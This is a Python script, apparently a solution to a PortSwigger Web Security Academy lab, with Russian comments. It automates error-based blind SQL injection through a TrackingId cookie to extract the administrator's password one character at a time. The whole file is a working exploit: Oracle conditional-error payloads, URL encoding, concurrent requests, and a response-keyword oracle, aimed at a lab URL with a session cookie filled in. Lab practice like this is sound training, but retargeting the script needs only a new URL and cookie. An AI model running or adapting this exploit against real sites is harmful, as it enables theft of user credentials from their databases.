import aiohttp
import asyncio
import string
from urllib.parse import quote

# === НАСТРОЙКИ ===
URL = "https://0ab1007804d4d2c1848836f700200088.web-security-academy.net/"
COOKIE_TEMPLATE = "TrackingId=HK3RmIU7p6MHTK4t{INJECT}; session=sTg4j8BkJcRvwMkJMPig1G3jLnOMTF43"
CHARS = string.ascii_lowercase + string.digits
PASSWORD_LENGTH = 20
KEYWORD = "Internal Server Error"
MAX_CONCURRENT = 5  # количество параллельных запросов
REQUEST_TIMEOUT = 10  # секунд

# === SQLi payload ===
def build_payload(pos, ch):
    # корректная форма payload (закрывающие скобки и завершающий ||' включены)
    raw = f"'||(SELECT CASE WHEN SUBSTR(password,{pos},1)='{ch}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    return quote(raw, safe='')  # полностью URL-энкодим

# === Проверка одного символа ===
async def try_char(session, pos, ch):
    inject = build_payload(pos, ch)
    cookie_value = COOKIE_TEMPLATE.replace("{INJECT}", inject)
    headers = {"Cookie": cookie_value}
    try:
        async with session.get(URL, headers=headers, timeout=REQUEST_TIMEOUT) as resp:
            text = await resp.text()
            if KEYWORD.lower() in text.lower():
                return ch
    except asyncio.TimeoutError:
        # таймаут — можно попробовать снова или считать как неудачу
        return None
    except Exception as e:
        # логируем для отладки (не прерываем весь процесс)
        print(f"[WARN] Exception for pos={pos}, ch={ch}: {e}")
        return None
    return None

# === Основной цикл ===
async def main():
    password = ""
    print(f"[INFO] Start brute force for {PASSWORD_LENGTH} characters...")

    conn = aiohttp.TCPConnector(ssl=False)  # если нужно игнорировать проблемы с SSL (разрешать только если уместно)
    timeout = aiohttp.ClientTimeout(total=None)  # управляем тайм-аутами в запросах отдельно
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        for pos in range(1, PASSWORD_LENGTH + 1):  # позиции с 1 по PASSWORD_LENGTH
            found_char = None
            # создаём корутины для всех символов
            coros = [try_char(session, pos, ch) for ch in CHARS]

            # запускаем пачками по MAX_CONCURRENT
            for i in range(0, len(coros), MAX_CONCURRENT):
                batch = coros[i:i+MAX_CONCURRENT]
                results = await asyncio.gather(*batch, return_exceptions=False)
                for res in results:
                    if res:
                        found_char = res
                        password += found_char
                        print(f"[FOUND] Position {pos} -> {found_char}")
                        break
                if found_char:
                    break

            if not found_char:
                print(f"[INFO] No matching character found at position {pos}")
                password += "?"

    print(f"[DONE] Password guessed: {password}")

# === Запуск ===
if __name__ == "__main__":
    asyncio.run(main())
